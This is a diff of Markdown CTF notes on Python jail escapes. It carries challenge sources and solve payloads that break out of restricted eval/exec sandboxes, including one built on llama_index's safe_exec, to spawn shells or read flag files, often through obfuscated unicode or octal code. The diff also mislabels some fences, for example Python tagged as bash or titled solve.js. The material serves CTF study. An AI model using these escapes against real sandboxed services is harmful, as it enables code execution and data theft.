@@ -15,7 +15,7 @@ tags:
 
 ### retrieving builtins
 
-```py
+```bash
 # obtain builtins from a globally defined built-in functions
 # https://docs.python.org/3/library/functions.html
 print.__self__
@@ -440,15 +440,11 @@ print("{0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[
 
 ### SECCON CTF 13: 1linepyjail
 
-- `jail.py`
-
-```py
+```py title="jail.py"
 print(eval(code, {"__builtins__": None}, {}) if len(code := input("jail> ")) <= 100 and __import__("re").fullmatch(r'([^()]|\(\))*', code) else ":(")
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 # @Ark - rerun w/ help while adding pdb to loaded sys modules
 "".__class__.__base__.__subclasses__()[141].__init__.__globals__["__builtins__"]["help"]()
 pdb
@@ -475,9 +471,7 @@ q
 
 ### idekCTF 2024: crator
 
-- `sandbox.py`
-
-```py
+```py title="sandbox.py"
 builtins_whitelist = set(
     (
         "RuntimeError",
@@ -619,9 +613,7 @@ class Sandbox(object):
                 del sys.modules["__main__"].__dict__["__builtins__"]["open"].__globals__[key]
 ```
 
-- `chall.py`
-
-```py
+```py title="chall.py"
 @app.route('/submit/<problem_id>', methods=['GET', 'POST'])
 @login_required
 def submit(problem_id):
@@ -658,9 +650,7 @@ def submit(problem_id):
     ...
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 # @Starlight - retrieve open from closure
 open = open.__closure__[0].cell_contents
 io = open.__self__
@@ -709,9 +699,7 @@ print(fake)
 
 ### UIUCTF 2024: ASTea
 
-- `chall.py`
-
-```py
+```py title="chall.py"
 import ast
 
 def safe_import():
@@ -745,9 +733,7 @@ ast.fix_missing_locations(cup)
 exec(compile(cup, '', 'exec'), {'__builtins__': {}}, {'safe_import': safe_import, 'safe_call': safe_call})
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 # (a:=lambda:..., b:=safe_import.__builtins__["help"]); a.__globals__["__builtins__"] |= {"safe_import": safe_import, "safe_call": safe_call, "help": b}; [help["sh"] for help.__class__.__getitem__ in [help["os"].system for help.__class__.__getitem__ in [safe_import.__builtins__["__import__"]]]]
 __builtins__ |= safe_import.__builtins__;
 [help["sh"] for help.__class__.__getitem__ in [help["os"].system for help.__class__.__getitem__ in [safe_import.__builtins__["__import__"]]]]
@@ -769,9 +755,7 @@ f"{license}"
 
 ### vsCTF 2024: llama-jail-revenge
 
-- `chall.py`
-
-```py
+```py title="chall.py"
 #!/usr/local/bin/python
 from exec_utils import safe_exec
 def my_safe_exec(__source):
@@ -796,9 +780,7 @@ if __name__ == "__main__":
         print(err)
 ```
 
-- `exec_utils.py`
-
-```py
+```py title="exec_utils.py"
 # code from https://github.com/run-llama/llama_index/blob/35afb6b93476ef4f4d61a48d847cd0b191ac5cb6/llama-index-experimental/llama_index/experimental/exec_utils.py
 # was main at the time of writing chall, however commit provided incase of changes
 import ast
@@ -974,9 +956,7 @@ def safe_exec(
     return exec(__source, _get_restricted_globals(__globals), __locals)
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 # Using "with"-statement context managers to expose/retrieve Exception classes
 # https://rszalski.github.io/magicmethods/#context
 ss = []
@@ -1000,9 +980,7 @@ except ex as e:
 
 ### UofTCTF 2024: Zero
 
-- `chal.py`
-
-```py
+```py title="chal.py"
 def check(code):
     # no letters
     alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
@@ -1025,9 +1003,7 @@ code = input(">>> ")
 safe_eval(code)
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 [*()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_(()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘤𝘭𝘢𝘴𝘴＿_)[[]>[]].𝘳𝘦𝘨𝘪𝘴𝘵𝘦𝘳._＿𝘣𝘶𝘪𝘭𝘵𝘪𝘯𝘴＿_.𝘷𝘢𝘭𝘶𝘦𝘴()][([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])](""._＿𝘥𝘰𝘤＿_[([]==[])+([]==[])+([]==[])+([]==[])]+""._＿𝘥𝘰𝘤＿_[[]>[]]).𝘴𝘺𝘴𝘵𝘦𝘮(""._＿𝘥𝘰𝘤＿_[[]>[]]+""._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘥𝘰𝘤＿_[([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])])
 
 # https://github.com/UofTCTF/uoftctf-2024-chals-public/blob/master/Jail/zero/solve/writeup.md
@@ -1036,9 +1012,7 @@ safe_eval(code)
 
 ### GlacierCTF 2023: Avatar
 
-- `server.py`
-
-```py
+```py title="server.py"
 print("You get one chance to awaken from the ice prison.")
 code = input("input: ").strip()
 whitelist = """gctf{"*+*(=>:/)*+*"}""" # not the flag
@@ -1050,9 +1024,7 @@ if any([x not in whitelist for x in code]) or len(code) > 40000:
 eval(eval(code, {'globals': {}, '__builtins__': {}}, {}), {'globals': {}, '__builtins__': {}}, {})
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 m = b"""[a for a in ().__class__.__base__.__subclasses__() if 'wrapper' not in f'{a.__init__}'][0].__init__.__builtins__['__import__']('os').system('sh')"""
 print(m)
 m = [int(x) for x in m]
@@ -1114,9 +1086,7 @@ print(eval(payload)) # verify payload is the same
 
 ### TFC CTF 2023: My Third Calculator
 
-- `server.py`
-
-```py
+```py title="server.py"
 import sys
 print("This is a safe calculator")
 inp = input("Formula: ")
@@ -1133,18 +1103,14 @@ fns = {
 print(eval(inp, fns, fns))
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 # [setattr(__import__('os'), 'environ', {'BROWSER': '/bin/sh -c "cat /flag" #%s'}), __import__('antigravity')]
 [𝘴𝘦𝘵𝘢𝘵𝘵𝘳(__𝘪𝘮𝘱𝘰𝘳𝘵__('\\157\\163'), '\\145\\156\\166\\151\\162\\157\\156', {'\\102\\122\\117\\127\\123\\105\\122':'\\57\\142\\151\\156\\57\\163\\150\\40\\55\\143\\40\\42\\143\\141\\164\\40\\57\\146\\154\\141\\147\\42\\40\\43\\45\\163'}), __𝘪𝘮𝘱𝘰𝘳𝘵__('\\141\\156\\164\\151\\147\\162\\141\\166\\151\\164\\171')]
 ```
 
 ### Equinor CTF 2023: Dis is it!
 
-- `main.py`
-
-```py
+```py title="main.py"
 from flask import Flask, request, redirect, send_from_directory
 import dis
 import io
@@ -1196,9 +1162,7 @@ if __name__ == '__main__':
     app.run('0.0.0.0', 1337)
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 # @null
 import requests
 # target = 'http://localhost:1337/'
@@ -1220,9 +1184,7 @@ print(requests.get(target + '/report/flag.txt').text)
 
 ### 37C3 Potluck CTF: tacocat
 
-- `main.py`
-
-```py
+```py title="main.py"
 while True:#
     x = input("palindrome? ")#
     assert "#" not in x, "comments are bad"#
@@ -1241,9 +1203,7 @@ while True:#
 #:eurT elihw
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 # setting up template for generating palindromes
 alph = "abcdefghijklmnopqrstvwyzABCDEFGHIJKLMNOPQRSTVWYZ1234567890!\\"#¤%&/()=?@$€{[]}"
 dd = r"""'START\\',)"CHAR"=:VAR1(,',(VAR1:="CHAR"),'\\START'"""
@@ -1322,9 +1282,7 @@ sh.interactive()
 
 ### Internet Festival 2023 CTF Finals: prison
 
-- `prison.py`
-
-```py
+```py title="prison.py"
 #!/usr/bin/env python3
 
 def main():
@@ -1348,9 +1306,7 @@ if __name__ == '__main__':
         main()
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 from pwn import *
 io = remote("challs.ifctf.fibonhack.it", 10010)
 payload = """
@@ -1367,9 +1323,7 @@ io.interactive()
 
 ### WACON 2023 Prequal: ScavengerHunt
 
-- `prob.py`
-
-```py
+```py title="prob.py"
 #!/usr/bin/env python3
 import secret
 import pyseccomp
@@ -1397,17 +1351,13 @@ except:
 exit(0)
 ```
 
-- `secret.py`
-
-```py
+```py title="secret.py"
 __builtins__ = {}
 
 some_unknown_and_very_long_identifier_name = "WACON2023{[REDACTED]}"
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 from pwn import *
 import time
 context.log_level = "critical"
@@ -1451,9 +1401,7 @@ print(flag)
 
 ### CrewCTF 2023: starship-1
 
-- `sandbox.py`
-
-```py
+```py title="sandbox.py"
 #!/usr/bin/env python3
 import re
 import sys
@@ -1499,9 +1447,7 @@ if prompt.isascii() and not re.findall(f'[{banned}]', prompt):
         pass
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 # @quasar - eval("__import__('os').system('sh')")
 a = """@__build_class__.__self__.eval
 @__build_class__.__self__.bytes
@@ -1563,9 +1509,7 @@ p.interactive()
 
 ### CrewCTF 2023: starship
 
-- `server.py`
-
-`````py
+`````py title="server.py"
 #!/usr/bin/env python
 import re
 import sys
@@ -1652,9 +1596,7 @@ except:
     pass
 `````
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 # @quasar - setting sys.stdout.flush to breakpoint
 [id for sys.stdout.flush in [id.__self__.__dict__[mA] for aA,bA,cA,dA,eA,fA,gA,hA,iA,jA,kA,lA,mA,nA,oA,pA,qA,rA,sA,tA,uA,vA,wA,xA,yA,zA,aB,bB,cB,dB,eB,fB,gB,hB,iB,jB,kB,lB,mB,nB,oB,pB,qB,rB,sB,tB,uB,vB,wB,xB,yB,zB,aC,bC,cC,dC,eC,fC,gC,hC,iC,jC,kC,lC,mC,nC,oC,pC,qC,rC,sC,tC,uC,vC,wC,xC,yC,zC,aD,bD,cD,dD,eD,fD,gD,hD,iD,jD,kD,lD,mD,nD,oD,pD,qD,rD,sD,tD,uD,vD,wD,xD,yD,zD,aE,bE,cE,dE,eE,fE,gE,hE,iE,jE,kE,lE,mE,nE,oE,pE,qE,rE,sE,tE,uE,vE,wE,xE,yE,zE,aF,bF,cF,dF,eF,fF,gF,hF,iF,jF,kF,lF,mF,nF,oF,pF,qF,rF,sF,tF,uF,vF,wF,xF,yF,zF,aG in [id.__self__.__dict__]]]
 
@@ -1692,9 +1634,7 @@ io.interactive()
 
 ### CrewCTF 2023: setjail
 
-- `main.py`
-
-```py
+```py title="main.py"
 import re
 import ast
 
@@ -1762,9 +1702,7 @@ elif last_attr_key is not None:
 print("Done")
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 # @Satoooon - https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code
 import: ctypes._aix
 path: .__loader__.exec_module.__globals__["sys"].modules["ctypes._aix"].environ["PYTHONINSPECT"]
@@ -1781,9 +1719,7 @@ value: "1"
 
 ### CrewCTF 2023: jailpie
 
-- `server.py`
-
-```py
+```py title="server.py"
 #!/usr/local/bin/python3
 import base64
 import types
@@ -1820,17 +1756,13 @@ if __name__ == '__main__':
     #     _print('Nice try!')
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 # TBA
 ```
 
 ### SEETF 2023: Another PyJail
 
-- `server.py`
-
-```py
+```py title="server.py"
 from types import CodeType
 
 def clear(code):
@@ -1849,9 +1781,7 @@ def clear(code):
 print(eval(clear(compile(input("> "), __name__, "eval")), {'__builtins__': {}}, {})(getattr))
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 @ juliapoo
 lambda g: (
     (lambda _0, _1:
@@ -1956,9 +1886,7 @@ print(val)
 
 ### BYUCTF 2023: Builtins 2
 
-- `b2.py`
-
-```py
+```py title="b2.py"
 inp = input("code> ")[:72]
 if "__" in inp:
     print("Nope")
@@ -1966,31 +1894,23 @@ else:
     print(eval(inp, {"__builtins__": {}}, {"__builtins__": {}}))
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 ()._＿class＿_._＿base＿_._＿subclasses＿_()[118].get_data('.','flag.txt')
 ```
 
 ### BYUCTF 2023: a-z0-9
 
-- `a-z0-9.py`
-
-```py
+```py title="a-z0-9.py"
 eval((__import__("re").sub(r'[a-z0-9]','',input("code > ").lower()))[:130])
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 __𝘪𝘮𝘱𝘰𝘳𝘵__(𝘤𝘩𝘳(𝘰𝘳𝘥('ʚ')-𝘰𝘳𝘥('ȫ'))+𝘤𝘩𝘳(𝘰𝘳𝘥('ř')-𝘰𝘳𝘥('æ'))).𝘴𝘺𝘴𝘵𝘦𝘮(𝘤𝘩𝘳(𝘰𝘳𝘥('ř')-𝘰𝘳𝘥('æ'))+𝘤𝘩𝘳(𝘰𝘳𝘥('ȉ')-𝘰𝘳𝘥('ơ')))
 ```
 
 ### BYUCTF 2023: Leet 2
 
-- `leet2.py`
-
-```py
+```py title="leet2.py"
 import re
 FLAG = open('flag.txt').read()
 inp = input('> ')
@@ -2000,39 +1920,29 @@ else:
     print(FLAG)
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 [_:=[]>[],~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_][[]==[]]*~_
 ```
 
 ### BYUCTF 2023: abcdefghijklm
 
-- `abcdefghijklm.py`
-
-```py
+```py title="abcdefghijklm.py"
 inp = input("code > ").lower()
 eval((inp[:4]+__import__("re").sub(r'[a-m]','',inp[4:]))[:80])
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.py"
 eval("op\\145n(*op\\145n('/\\146\\154\\141\\147.txt'))")
 ```
 
 ### BYUCTF 2023: nopqrstuvwxyz
 
-- `nopqrstuvwxyz.py`
-
-```py
+```py title="nopqrstuvwxyz.py"
 inp = input("code > ").lower()
 eval((inp[:4]+__import__("re").sub(r'[n-z]','',inp[4:]))[:80])
 ```
 
-- `solve.py`
-
-```py
+```py title="solve.js"
 eval("\\157\\160e\\156(*\\157\\160e\\156('/flag.\\164\\170\\164'))")
 ```
 
